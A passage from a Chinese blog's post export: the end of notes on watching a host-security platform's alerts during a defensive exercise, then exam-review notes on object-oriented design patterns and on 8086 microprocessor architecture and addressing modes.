<h2 id="入侵处理记录"><a href="#入侵处理记录" class="headerlink" title="入侵处理记录"></a>入侵处理记录</h2><p>总结：<strong>最重要的web后门和web命令执行这两个是最重要的告警，web命令执行一定要加白，保证我们漏洞告警准确！</strong></p>
<h1 id="合规基线"><a href="#合规基线" class="headerlink" title="合规基线"></a>合规基线</h1><p>不太需要</p>
<h1 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h1><p><strong>有个全量的日志告警</strong></p>
<h1 id="任务系统"><a href="#任务系统" class="headerlink" title="任务系统"></a>任务系统</h1><h2 id="快速任务"><a href="#快速任务" class="headerlink" title="快速任务"></a>快速任务</h2><p>包含了许多的<strong>溯源</strong>的一些小工具，查找一些文件的特性等等。<strong>建议有研判能力的使用</strong></p>
<h1 id="通用功能"><a href="#通用功能" class="headerlink" title="通用功能"></a>通用功能</h1><p>需要关注的就是事件采集，系统设置啊</p>
<h2 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h2><p>Agent的安装，生成安装命令等，客户已经搞好了一般不用管</p>
<h2 id="事件采集"><a href="#事件采集" class="headerlink" title="事件采集"></a>事件采集</h2><p><strong><img src="https://gylq.gitee.io/linkimage/img1/image-20211231163819830.png" alt="image-20211231163819830"></strong></p>
<p>agent不准的话，可以去跟原厂说就好了</p>
<h1 id="小铃铛"><a href="#小铃铛" class="headerlink" title="小铃铛"></a>小铃铛</h1><p><strong>一开始说的告警小铃铛，这个小铃铛是带铃声的，如果是用笔记本的话，建议大家把音量打开</strong></p>
<h2 id="服务工具"><a href="#服务工具" class="headerlink" title="服务工具"></a>服务工具</h2><p><strong>会将agent的一些离线和卸载进行调整</strong></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231165754819.png" alt="image-20211231165754819"></p>
<h2 id="消息配置"><a href="#消息配置" class="headerlink" title="消息配置"></a>消息配置</h2><p>有一些有危险程度的，建议把<strong>高中低危都要告警</strong>，不要放过任何告警，有的建议都打开</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231164049016.png" alt="image-20211231164049016"></p>
<p>查看更多会查看到每个消息</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231164200970.png" alt="image-20211231164200970"></p>
<p>每点击任何一个，都可以跳到对应的功能区域。除了关注入侵检测，和资产等，<strong>还要关注Agent被卸载，或者系统监控Agent离线超过一定时间等</strong></p>
<p>hw期间不应该存在agent被卸载，被卸载一定要注意。</p>
<p><strong>在小铃铛的话，我建议一直盯着小铃铛自动刷新比较好。一定要把所有危险程度的，高中低位的各种告警</strong></p>
<p>这个是在hw的时候，一定要关注的部分</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我总结一下大部分的会做的事，<strong>看小铃铛</strong>，听声音，三大功能模块。<strong><code>资产清点</code>能够快速定位到有问题的资产和更新</strong>，<code>风险发现</code><strong>是需要给客户做整改的，需要给客户一些最新的风险数据信息</strong>，<code>入侵检测</code><strong>就是整个hw期间需要监控的，尤其是web命令执行的告警，盯住消息系统，什么时候的信息都需要关注agent的离线和卸载。</strong></p>
<p>建议：有告警就上报，不要擅自决定。所有决定跟客户商量</p>
<p><strong>hw</strong>：分为两个，就是<strong>溯源</strong>，还有提前监控<strong>抑制</strong>，溯源到最后给黑客画像也是对的。</p>
<p>个人博客：<a href="https://gylq.gitee.io/">https://gylq.gitee.io/</a></p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>监控设备</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】设计模式期末复习</title>
    <url>/posts/183.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="七大设计原则"><a href="#七大设计原则" class="headerlink" title="七大设计原则"></a>七大设计原则</h2><p>软件的<strong>可维护性</strong>和<strong>可复用性</strong>（？）</p>
<p>软件可维护性:即维护人员对该软件进行维护的难易程度,具体包括理解、改正、改动和改进该软件的难易程度。</p>
<p>可复用性：复用又叫重用，是重复使用的意思。指软件能够被重复使用的难易程度</p>
<ul>
<li><p>面向对象设计原则为<strong>支持可维护性复用</strong>而诞生</p>
</li>
<li><p><strong>指导性原则</strong>，非强制性原则</p>
</li>
<li><p>每一个设计模式都符合一个或多个面向对象设计原则，面向对象设计原则是<strong>用于评价一个设计模式的使用效果的重要指标之一</strong></p>
</li>
<li><p>面向对象设计原则概述</p>
<ul>
<li><strong>单一职责原则</strong>：一个对象应只包含单一的职责，并且该职责被完整地封装在一个类中<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226211132645.png" alt="image-20211226211132645"></li>
</ul>
</li>
<li><strong>开闭原则</strong>：软件实体应当对扩展开放，对修改关闭<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226210104361.png" alt="image-20211226210104361"></li>
</ul>
</li>
<li>（LSP）<strong>里氏代换原则</strong>：所有引用基类的地方必须能透明地使用其子类的对象<ul>
<li>子类必须能够替换掉他们的父类型<ul>
<li>只要是基类出现的地方，一定能出现子类</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211227085458973.png" alt="image-20211227085458973"></li>
</ul>
</li>
</ul>
</li>
<li><strong>依赖倒转原则</strong>：高层模块不应该依赖底层模块，它们都应该依赖抽象。抽象不应该依赖于细节，细节应该依赖于抽象<ul>
<li>其核心思想是：<strong>要面向接口编程，不要面向实现编程</strong><ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211227090210588.png" alt="image-20211227090210588"></li>
</ul>
</li>
</ul>
</li>
<li><strong>接口隔离原则</strong>：客户端不应该依赖那些它不需要的接口<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211227090131224.png" alt="image-20211227090131224"></li>
</ul>
</li>
<li><strong>合成复用原则</strong>：优先使用对象组合，而不是继承来达到复用的目的<ul>
<li>它要求在软件复用时，<strong>要尽量先使用组合或者聚合等关联关系来实现，其次才考虑使用继承关系来实现。</strong>如果要使用继承关系，则必须遵循</li>
</ul>
</li>
<li><strong>迪米特法则</strong>：每一个软件单位对其他的单位都只有最少的知识，而且局限于哪些本单位密切相关的软件单位<ul>
<li>LoD又叫做最少知识原则（LKP），其定义是：<strong>只与你的直接朋友交谈，不跟“陌生人“说话</strong>。建议多使用Private和Protect，少用public<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211227090706533.png" alt="image-20211227090706533"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>设计模式的分类</p>
<p>根据其目的（模式是用来做什么的）可分为创建型、结构型和行为型三种：</p>
<p>①创建型模式主要用于创建对象。</p>
<p>②结构型模式主要用于处理类或对象的组合。</p>
<p>③行为型模式主要用于描述对类或对象怎样交互和怎样分配职责。</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211227184137147.png" alt="image-20211227184137147"></p>
<h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><ul>
<li>确保一个类只有一个实例，并提供一个全局访问点来访问这个唯一实例</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228094418533.png" alt="image-20211228094418533"></p>
<ul>
<li><p><strong>简单工厂模式</strong>：又称为静态工厂方法模式， 它属于类创建型模式。在简单工厂模式中，可以<strong>根据参数的不同返回不同类的实例</strong>。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">模式角色</span><br><span class="line">工厂：Factory</span><br><span class="line">    由客户端直接调用，在该类中声明一个创建新对象的接口</span><br><span class="line">抽象产品： Product</span><br><span class="line">    具体产品的共同接口，是所要创建的对象的公共父类</span><br><span class="line">具体产品：ConcreteProduct</span><br><span class="line">    由工厂所创建的对象</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228094453461.png" alt="image-20211228094453461"></p>
</li>
<li><p><strong>工厂方法模式</strong>又称为工厂模式， 它属于类创建型模式。在工厂方法模式中， 工厂父类负责定义创建产品对象的公共接口， 而工厂子类则负责生成具体的产品对象， 这样做的目的是将产品类的实例化操作延迟到工厂子类中完成， 即通过工厂子类来确定究竟应该实例化哪一个具体产品类。</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228094542413.png" alt="image-20211228094542413"></p>
</li>
<li><p>提供一个创建一系列相关或相互依赖对象的接口， 而无须指定它们具体的类。抽象工厂模式又称为Kit 模式，属于对象创建型模式。</p>
<p>–抽象工厂模式包含以下4个角色：</p>
<p>•AbstractFactory（抽象工厂）</p>
<p>•ConcreteFactory（具体工厂）</p>
<p>•AbstractProduct（抽象产品）</p>
<p>•ConcreteProduct（具体产品）</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228094619977.png" alt="image-20211228094619977"></p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228094634944.png" alt="image-20211228094634944"></p>
</li>
<li><p><strong>建造者模式</strong></p>
<ul>
<li><p>•将一个复杂对象的构建与它的表示分离， 使得同样的构建过程可以创建不同的表示。</p>
<p>–建造者模式包含以下4个角色：</p>
<p>•Builder（抽象建造者）</p>
<p>•ConcreteBuilder（具体建造者）</p>
<p>•Product（产品）</p>
<p>•Director（指挥者）</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228094719500.png" alt="image-20211228094719500"></p>
</li>
</ul>
</li>
<li><p><strong>重点：建造者的退化模式是通过合并抽象建造者、指挥者角色完成退化的。</strong></p>
</li>
<li><p>•原型模式的定义</p>
<p>–利用一个对象，快速地生成一批对象.</p>
<p>–通过克隆方法所创建的对象是<strong>全新的对象</strong>，它们在内存中拥有新的地址，每一个克隆对象都是<strong>独立</strong>的</p>
<p>–</p>
<p>–原型模式包含以下3个角色：</p>
<p>•Prototype（抽象原型类）</p>
<p>•ConcretePrototype（具体原型类）</p>
<p>•Client（客户类）</p>
<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211228094835214.png" alt="image-20211228094835214"></li>
</ul>
</li>
<li><p><strong>•浅克隆与深克隆</strong></p>
<p><strong>–浅克隆(Shallow Clone)：当原型对象被复制时，只复制它本身和其中包含的值类型的成员变量，而引用类型的成员变量并没有复制</strong></p>
<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211228094931677.png" alt="image-20211228094931677"></li>
</ul>
</li>
<li><p><strong>浅拷贝：仅仅复制所考虑的对象，</strong>不复制它所引用的成员对象，例如Sheet s<strong>。</strong></p>
</li>
<li><p><strong>深拷贝：**</strong>两者都复制。**</p>
</li>
</ul>
<ul>
<li><p>•<strong>结构型模式**</strong>(Structural Pattern)**关注如何将现有类或对象组织在一起形成更加强大的结构</p>
<p>•不同的结构型模式从不同的角度组合类或对象，它们在尽可能满足各种面向对象设计原则的同时为类或对象的组合提供一系列巧妙的解决方案</p>
</li>
</ul>
<ul>
<li><p>适配器模式：将一个类的接口转换成客户希望的另一个接口，适配器模式让那些接口不兼容的类可以一起工作</p>
</li>
<li><p>适配器模式包含以下3个角色：</p>
<p>•Target（目标抽象类）</p>
<p>•Adapter（适配器类）</p>
<p>•Adaptee（适配者类）</p>
<ul>
<li><strong>类适配器</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228102933876.png" alt="image-20211228102933876"></p>
</li>
<li><p>•理解2：对象适配器（组合聚集）</p>
<p>•对象适配器模式是合成复用原则的典型应用。</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228103002330.png" alt="image-20211228103002330"></p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228103026315.png" alt="image-20211228103026315"></p>
</li>
<li><p>总结</p>
<ul>
<li><p>•模式优点</p>
<p>–将<strong>目标类和适配者类解耦</strong>，通过引入一个适配器类来重用现有的适配者类，无须修改原有结构</p>
<p>–<strong>增加了类的透明性和复用性</strong>，提高了适配者的复用性，同一个适配者类可以在多个不同的系统中复用</p>
<p>–灵活性和扩展性非常好</p>
<p>–<strong>类适配器模式</strong>：置换一些适配者的方法很方便</p>
<p>–<strong>对象适配器模式</strong>：可以把多个不同的适配者适配到同一个目标，还可以适配一个适配者的子类</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><strong>外观模式：</strong>又称为门面模式</li>
</ul>
<p>是迪米特法则的一种具体实现</p>
<p>1.通过引入一个新的外观角色来降低原有系统的复杂度，同时降低客户类与子系统的耦合度</p>
<p>2.对客户屏蔽了子系统组件，减少了客户处理的对象数</p>
<p>3.使得子系统使用起来更加容易</p>
<p>4.降低了大型软件系统中的编译依赖性，简化了系统在不同平台之间的移植过程</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">外观模式包含以下2个角色：</span><br><span class="line"></span><br><span class="line">•Facade（外观角色）</span><br><span class="line"></span><br><span class="line">•SubSystem（子系统角色）</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228221138388.png" alt="image-20211228221138388"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228221238081.png" alt="image-20211228221238081"></p>
<ul>
<li><p>它<strong>对客户端屏蔽了子系统组件，减少了客户端所需处理的对象数目并使得子系统使用起来更加容易</strong></p>
</li>
<li><p>它<strong>实现了子系统与客户端之间的松耦合关系</strong>，这使得子系统的变化不会影响到调用它的客户端，只需要调整外观类即可</p>
</li>
<li><p>一个子系统的修改对其他子系统没有任何影响，而且子系统的<strong>内部变化也不会影响到外观对象</strong></p>
</li>
<li><p><strong>外观模式-模式缺点</strong></p>
<p>–不能很好地限制客户端直接使用子系统类，如果对客户端访问子系统类做太多的限制则减少了可变性和灵活性</p>
<p>–如果设计不当，增加新的子系统可能需要修改外观类的源代码，违背了开闭原则</p>
</li>
<li><p><strong>代理模式的定义</strong></p>
<p>–引入一个新的代理对象</p>
<p>–代理对象在客户端对象和目标对象之间起到中介的作用</p>
<p>–去掉客户不能看到的内容和服务或者增添客户需要的额外的新服务</p>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">代理模式包含以下3个角色：</span><br><span class="line">Subject（抽象主题角色）</span><br><span class="line">Proxy（代理主题角色）</span><br><span class="line">RealSubject（真实主题角色）</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>•策略模式的定义</p>
<p>–又称为政策(Policy)模式</p>
<p>–每一个封装算法的类称之为策略(Strategy)类</p>
<p>–策略模式提供了一种可插入式(Pluggable)算法的实现方案</p>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">策略模式包含以下3个角色：</span><br><span class="line">Context（环境类）</span><br><span class="line">Strategy（抽象策略类）</span><br><span class="line">ConcreteStrategy（具体策略类）</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228233327759.png" alt="image-20211228233327759"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228233342831.png" alt="image-20211228233342831"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228233349394.png" alt="image-20211228233349394"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228233540364.png" alt="image-20211228233540364"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228233636223.png" alt="image-20211228233636223"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228233811615.png" alt="image-20211228233811615"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228233834207.png" alt="image-20211228233834207"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228233846426.png" alt="image-20211228233846426"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228233914289.png" alt="image-20211228233914289"></p>
<ul>
<li><p>命令模式</p>
</li>
<li><p><strong>命令模式：**</strong>请求以命令的形式包裹在对象中<strong>，并传给调用对象。对请求排队</strong>或者<strong>记录请求日志</strong>，以及支持可撤销的操作。</p>
</li>
<li><p>命令模式包含以下4个角色：</p>
<p>•Command（抽象命令类）</p>
<p>•ConcreteCommand（具体命令类）</p>
<p>•Invoker（调用者）</p>
<p>•Receiver（接收者）</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228235938635.png" alt="image-20211228235938635"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228235945196.png" alt="image-20211228235945196"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229000039279.png" alt="image-20211229000039279"></p>
</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229000100184.png" alt="image-20211229000100184"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228235752055.png" alt="image-20211228235752055"></p>
<ul>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211228234613278.png" alt="image-20211228234613278"></p>
</li>
<li><p><strong>–观察者模式：</strong></p>
<p>•定义了对象之间一种一对多的依赖关系，让一个对象的改变能够影响其他对象</p>
<p>•发生改变的对象称为<strong>观察目标</strong>，被通知的对象称为<strong>观察者</strong></p>
<p>•<strong>一个观察目标</strong>可以对应<strong>多个观察者</strong></p>
</li>
<li><ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211229002844294.png" alt="image-20211229002844294"></li>
</ul>
</li>
<li><p>状态模式</p>
<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211229004059006.png" alt="image-20211229004059006"></li>
</ul>
</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229004436806.png" alt="image-20211229004436806"></p>
<ul>
<li><p><strong>模板方法模式：</strong>定义一个操作中<strong>算法的框架</strong>，而<strong>将一些步骤延迟到子类中</strong>。模板方法模式使得子类不改变一个算法的结构即可<strong>重定义</strong>该算法的<strong>某些特定步骤</strong>。</p>
</li>
<li><p>（1）AbstractClass 抽象类</p>
<ul>
<li><p>类中实现了模板方法，定义了算法的骨架，具体子类需要去实现，其他的抽象方法o1,2,3,4</p>
<p>（2）ConcreteClass 实现抽象方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">模板方法模式包含以下两个角色：</span><br><span class="line">AbstractClass（抽象类）</span><br><span class="line">ConcreteClass（具体子类）</span><br></pre></td></tr></table></figure></div>



</li>
</ul>
</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229004635675.png" alt="image-20211229004635675"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229004846848.png" alt="image-20211229004846848"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229005359728.png" alt="image-20211229005359728"></p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】微机原理期末复习</title>
    <url>/posts/182.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="知识前置"><a href="#知识前置" class="headerlink" title="知识前置"></a>知识前置</h2><p>位：计算机能表示的最小数据单位</p>
<p>字节：一个8位二进制数成为1字节</p>
<p>字：一个16位二进制数称1个字</p>
<p>机器数：计算机中的数据，分为数值数据和非数值数据</p>
<p>真值：机器数代表的真正的数值</p>
<p>字长：处理器的二进制位数（8位处理器字长为8位）</p>
<p>溢出别：补码运算时，若运算结果超过其表示的数的范围，则溢出。</p>
<p>技巧：由于溢出只可能出现在同号相加或异号相减运算时，且采用补码减法可转变为加法，最直观、最易于理解的溢出判定方法是：若正数加正数，结果为负数或负数加负数，结果为正数，则发生溢出。</p>
<p>Asciil码：</p>
<p>数字符0-9的Ascii码为30H~39H（48）</p>
<p>大写字母A-Z的Ascii码为41H-5AH（65）</p>
<p>BCD码：十进制可采用二进制编码来表示——本质还是十进制数</p>
<p>压缩BCD码：一个字节表示两位十进制数 16 - 0001 0110</p>
<p>非压缩BCD码：一个字节表示一位十进制数 16 - 00000001 00000110</p>
<p>BCD码本质上是二进制编码的十进制数</p>
<p>带符号的机器数表示方式：原码、补码、反码</p>
<ul>
<li>原码<ul>
<li>最高位是符号位，0为正，1位负，范围 -127 - +127</li>
</ul>
</li>
<li>反码<ul>
<li>正数：原码=反码=补码</li>
<li>负数：符号位不变，数值位求反</li>
<li>范围和原码一样</li>
</ul>
</li>
<li>补码<ul>
<li>正数：和反码一样</li>
<li>负数：反码+1</li>
<li>范围： -128 - +127</li>
</ul>
</li>
<li>运算规则：<ul>
<li>符号位与数值位一起运算</li>
<li>符号位产生进位可舍去</li>
</ul>
</li>
<li>微机组成<ul>
<li><strong>CPU（运算器和控制器）、输入输出设备、接口电路和系统总线</strong></li>
</ul>
</li>
<li>总线<ul>
<li>总线是CPU向存储器和输入/输出接口传送地址、数据和控制信息的公共通道<ul>
<li>数据总线（16）：传输数据</li>
<li>地址总线（20）：传输地址信息</li>
<li>控制总线（16）：传输控制信号</li>
<li>例：8086的数据线为16位，地址线为20位，I/O口使用16位地址线</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="8088-8086微处理器"><a href="#8088-8086微处理器" class="headerlink" title="8088/8086微处理器"></a>8088/8086微处理器</h3><ul>
<li><p>8086:16位微处理器</p>
</li>
<li><p>8088：准16位处理器</p>
</li>
<li><p>8086和8088的区别：</p>
<ul>
<li>8086 BIU中的<strong>指令队列</strong>是6字节，外部数据总线16位</li>
<li>8088 BIU中的<strong>指令队列</strong>是4字节，外部数据总线8位</li>
</ul>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211224082703409.png" alt="image-20211224082703409"></p>
</li>
<li><p>EU（执行单元）</p>
<ul>
<li>负责指令的译码和执行</li>
<li>负责向总线接口部件BIU它提供偏移地址</li>
<li>对通用寄存器和标志寄存器进行管理<ul>
<li>EU组成<ul>
<li>算术逻辑单元ALU</li>
<li>标志寄存器FR</li>
<li>通用寄存器<ul>
<li>数据寄存器<ul>
<li>16位数据AX、BX、CX、DX</li>
</ul>
</li>
<li>16位指针寄存器：SP、BP</li>
<li>16位变址寄存器：DI、SI</li>
</ul>
</li>
<li>暂存寄存器</li>
<li>EU控制电路</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>BIU（总线接口单元）</p>
<ul>
<li>负责CPU与内存或I/O端口传送指令或数据<ul>
<li>BIU从内存取指令送到指令队列缓冲器。</li>
<li>当EU执行指令时，BIU要配合EU从指定的内存单元或I/O中端口汇总读取数据，或者把EU的操作结果送到指定的内存单元或I/O端口去</li>
<li>BIU的组成<ul>
<li>段寄存器<ul>
<li>代码段寄存器CS</li>
<li>堆栈段寄存器SS</li>
<li>数据段寄存器DS</li>
<li>附加段寄存器ES</li>
</ul>
</li>
<li>指令指针寄存器IP</li>
<li>地址加法器</li>
<li>指令预取队列</li>
<li>总线控制逻辑</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>数据寄存器</p>
<ul>
<li>AX 累加器 </li>
<li>BX 基数寄存器 basic</li>
<li>CX 计数寄存器 count</li>
<li>DX 数据寄存器 data</li>
</ul>
</li>
<li><p>变址寄存器：存放当前数据段的偏移地址</p>
<ul>
<li>SI 源变址寄存器 source</li>
<li>DI 目的变址寄存器 destination</li>
</ul>
</li>
<li><p>指针寄存器：用来存取位于当前<strong>堆栈段</strong>中的数据</p>
<ul>
<li>BP 基址指针寄存器：存放位于堆栈段中的一个<strong>数据区基址</strong>的<strong>偏移地址</strong>-表明数据区在哪里开始 basic adress  Pointer</li>
<li>SP 堆栈指针寄存器：给出<strong>栈顶</strong>的偏移地址  stack pointer</li>
</ul>
</li>
<li><p>段寄存器</p>
<ul>
<li>DS 数据段寄存器 Data</li>
<li>ES 附加段寄存器  Extra</li>
<li>SS 堆栈段寄存器  Stack</li>
<li>CS 代码段寄存器  Code</li>
</ul>
</li>
<li><p>控制寄存器</p>
<ul>
<li>IP 指令指针寄存器：存放着BIU要取的下一条指令<strong>的偏移地址</strong><ul>
<li>下一条指令的物理地址=CSx16+IP  instructions</li>
</ul>
</li>
<li>PSW 状态标志寄存器  <ul>
<li>①状态标志<ul>
<li><strong>进位标志CF：最高位产生进位/借位，CF=1</strong></li>
<li><strong>奇偶标志PF：运算结果低8位中个“1”的个数为偶数，则PF=1</strong></li>
<li>辅助进位标志AF：低4位向高4位有进位，则AF=1</li>
<li>零标志ZF：运算结果为0，则ZF=1</li>
<li>符号标志SF：最高位为1，表示结果为负数，则SF=1</li>
<li>溢出标志OF：运算过程中发生“溢出”，则OF=1</li>
</ul>
</li>
<li><strong>②控制标志</strong><ul>
<li>中断允许标志IF <ul>
<li>IF=1，<strong>则CPU可以接受可屏蔽中断请求</strong></li>
</ul>
</li>
<li><strong>方向标志DF</strong> direction flag<ul>
<li>DF=1时，地址自动递减；</li>
<li>DF=0时，地址自动递增；</li>
</ul>
</li>
<li><strong>跟踪（陷阱）标志TF</strong> trick flag<ul>
<li>为调试程序的方便而设置的</li>
<li>TF=1，则处于单步工作方式</li>
<li>TF=0，将正常执行程序</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>段寄存器</p>
<ul>
<li>代码段（CS）：用来存放当前正在运行的<strong>程序</strong>。<strong>不能做目的操作数</strong></li>
<li>数据段（DS）：存放当前运行程序所用的数据</li>
<li>堆栈段（SS）：<strong>堆栈</strong>作用是保护数据</li>
<li>附加数据段（ES）：<strong>辅助</strong>的数据区</li>
</ul>
</li>
<li><p><strong>为什么要分段</strong></p>
<ul>
<li>8086/8088有<strong>20位地址线</strong>，能够寻址<strong>1MB的内存空间</strong>，但<strong>寄存器是16位</strong>，只能寻址64KB存储空间，所以要分段，把1MB的存储空间分成若干逻辑段，每个逻辑段最大具有64KB的存储空间</li>
</ul>
<p>8086/8088 20 2^20 =1 MB  寄存器16位，2^16=64KB，分段，把1MB空间分成若干逻辑段，每个逻辑段最大具有64KB的存储空间</p>
</li>
<li><p>分段的概念：</p>
<ul>
<li>把1MB的存储空间分成<strong>若干逻辑段</strong>，每个逻辑段最大具有64KB的存储空间。</li>
</ul>
</li>
<li><p>物理地址形成</p>
<ul>
<li>物理地址：即实际地址，例如00000H。一个存储单元的物理地址是唯一的，而逻辑地址是可以不唯一的。</li>
<li>段基址：段首址的高16位。段基址存放在段寄存器DS、ES、SS或CS中。</li>
<li><strong>偏移地址</strong>：段内存储单元距离段首地址的偏移量，也称有效地址<strong>EA</strong>，存放在IP、BP、SI、DI或BX中。偏移地址方位：0000H~FFFFH</li>
<li>逻辑地址：通常用<strong>段基址</strong>：<strong>偏移地址</strong>的形式来描述，在程序中使用。</li>
<li>例如<ul>
<li>0000H:0001H</li>
<li>物理地址=段基址x16+偏移量</li>
<li>常用：CS：IP、SS：SP</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225092027199.png" alt="image-20211225092027199"></p>
<p>题</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225092345783.png" alt="image-20211225092345783"></p>
<ul>
<li><p>堆栈</p>
<ul>
<li>堆栈是以<strong>“先进后出“或”后进先出“</strong>原则管理的<strong>存储区域</strong>。SS（堆栈是保护数据）给出堆栈段的段基址，SP存放<strong>栈顶地址</strong>，指出从栈顶到段首址的偏移量</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225093428511.png" alt="image-20211225093428511"></p>
</li>
<li><p>PUSH AX：；入栈</p>
<ul>
<li>SP-2 ——&gt; SP</li>
<li>再将数据入栈（低八位放入低字节，高八位放入高字节）</li>
</ul>
</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225093358367.png" alt="image-20211225093358367"></p>
<ul>
<li><p><strong>POP AX：出栈</strong></p>
<ul>
<li>先栈顶数据出栈</li>
<li>再SP+2——&gt;SP</li>
</ul>
</li>
<li><p>8086/8088 CPU 引脚</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225093830853.png" alt="image-20211225093830853"></p>
</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225093859813.png" alt="image-20211225093859813"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225093932682.png" alt="image-20211225093932682"></p>
<h3 id="指令系统"><a href="#指令系统" class="headerlink" title="指令系统"></a>指令系统</h3><ul>
<li><p>指令格式</p>
<ul>
<li>操作码 操作数/目的操作数，源操作数</li>
</ul>
</li>
<li><p>寻址方式</p>
<ul>
<li><p>①<strong>立即数</strong>寻址——直接给出<strong>操作数</strong></p>
<ul>
<li>MOV CX, 2A50H</li>
<li>将立即数2A50H送到CX寄存器中。</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225102521636.png" alt="image-20211225102521636"></li>
</ul>
</li>
<li><p>②<strong>寄存器</strong>寻址</p>
<ul>
<li>操作数为内部寄存器（AX/BX/CX/DX/SI/DI/SP/BP）</li>
<li>MOV DX, AX</li>
